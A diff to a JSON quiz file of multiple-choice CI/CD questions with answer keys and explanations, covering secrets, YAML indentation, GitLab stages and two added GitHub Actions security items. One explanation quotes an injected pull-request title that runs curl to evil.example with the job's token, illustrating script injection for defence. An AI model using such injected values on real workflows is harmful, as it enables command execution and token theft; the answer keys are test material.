@@ -75,7 +75,7 @@
    "In a commit message"
   ],
   "answer": 0,
-  "explain": "The CI's secret storage (GitHub secrets, GitLab CI variables) keeps passwords outside the code: they are hidden in the job logs and never end up in git. Anything written in the YAML, the README or a commit message is readable by everyone who can read the repository. Give each secret only to the jobs that need it."
+  "explain": "The CI's secret storage (GitHub secrets, GitLab CI variables) keeps passwords outside the code: they never end up in git, and the job logs mask them (a help, not a guarantee: never echo one). Anything written in the YAML, the README or a commit message is readable by everyone who can read the repository. Give each secret only to the jobs that need it."
  },
  {
   "id": "cicd-1-07",
@@ -127,7 +127,7 @@
    "Blank lines"
   ],
   "answer": 0,
-  "explain": "YAML is written like an outline: a line pushed further right belongs to the line above it, and each level is 2 spaces further right. When a line isn't lined up with the lines it belongs with, the file no longer says what you meant: the pipeline breaks, or a step ends up in another job. Only spaces are allowed, never tabs."
+  "explain": "YAML is written like an outline: a line pushed further right belongs to the line above it, and each level is usually 2 spaces further right (the number is free). When a line isn't lined up with the lines it belongs with, the file no longer says what you meant: the pipeline breaks, or a step ends up in another job. Only spaces are allowed, never tabs."
  },
  {
   "id": "cicd-1-11",
@@ -140,12 +140,12 @@
    "It runs only at night"
   ],
   "answer": 0,
-  "explain": "when: manual puts the job in the pipeline but doesn't start it: a play button appears in the pipeline page, and the job runs when someone with the rights clicks it. It's a simple safety for production deploys: the tests run by themselves, a human decides when to ship."
+  "explain": "when: manual puts the job in the pipeline but doesn't start it: a play button appears in the pipeline page, and the job runs when someone with the rights clicks it. On its own it doesn't stop the pipeline: later stages go on. Inside rules:, the pipeline waits (blocked) until someone clicks."
  },
  {
   "id": "cicd-1-12",
   "level": 1,
-  "q": "GitLab refuses your pipeline: 'unit job: chosen stage does not exist'. What do you check?",
+  "q": "GitLab refuses your pipeline: 'unit job: chosen stage tests does not exist; available stages are .pre, build, test, deploy, .post'. What do you check?",
   "choices": [
    "That the job's stage: is listed under stages:",
    "That the runner is online",
@@ -153,7 +153,7 @@
    "That the job has an image:"
   ],
   "answer": 0,
-  "explain": "stages: at the top of .gitlab-ci.yml lists the stages in the order they run, and each job's stage: must be one of them. A typo like tests instead of test is enough for GitLab to refuse the whole file, before any job runs. The CI lint page (CI/CD > Editor) shows such errors as you type."
+  "explain": "stages: at the top of .gitlab-ci.yml lists the stages in the order they run, and each job's stage: must be one of them. A typo like tests instead of test is enough for GitLab to refuse the whole file, before any job runs. The pipeline editor (Build > Pipeline editor) shows such errors as you type."
  },
  {
   "id": "cicd-1-13",
@@ -166,7 +166,7 @@
    "Only a warning in the logs"
   ],
   "answer": 0,
-  "explain": "YAML is written like an outline: lines that belong together start at the same place, and each level is 2 spaces further right. A line out of line no longer belongs where you meant: GitHub rejects the file, or reads the line as part of something else. An editor that knows YAML shows the outline and makes it easy to line things up."
+  "explain": "YAML is written like an outline: lines that belong together start at the same place, and each level is usually 2 spaces further right. A line out of line no longer belongs where you meant: GitHub rejects the file, or reads the line as part of something else. An editor that knows YAML shows the outline and makes it easy to line things up."
  },
  {
   "id": "cicd-2-01",
@@ -336,5 +336,31 @@
   ],
   "answer": 0,
   "explain": "A workflow that runs on push and pull_request runs for every branch and every pull request. Without a condition, any of them would deploy to production. github.ref is the full name of what triggered the run: refs/heads/main for the main branch. With this if, the other runs still test, but skip the deploy."
+ },
+ {
+  "id": "cicd-2-14",
+  "level": 2,
+  "q": "A workflow step runs: echo \"${{ github.event.pull_request.title }}\". Why is that dangerous?",
+  "choices": [
+   "The title becomes part of the script",
+   "The title may be too long for echo",
+   "echo can't print GitHub variables",
+   "It only works on the main branch"
+  ],
+  "answer": 0,
+  "explain": "${{ }} is replaced before the shell runs, so the PR title becomes part of the script: a title like \"; curl evil.example #\" runs that command, with the job's token. Pass untrusted text through env: (TITLE: ${{ github.event.pull_request.title }}) and use \"$TITLE\" in the script: then it stays text."
+ },
+ {
+  "id": "cicd-2-15",
+  "level": 2,
+  "q": "Why is a pull_request_target workflow that checks out the PR's code dangerous?",
+  "choices": [
+   "Fork code runs with your secrets",
+   "It runs the tests twice",
+   "It only runs on forks",
+   "It can't read the repository"
+  ],
+  "answer": 0,
+  "explain": "pull_request_target runs in your repository's context, with its secrets and a token that can write. Check out the PR's code there and a stranger's fork runs its own code with them. Use pull_request for testing outside code: it gets no secrets and a read-only token. Never check out untrusted code in pull_request_target."
  }
 ]
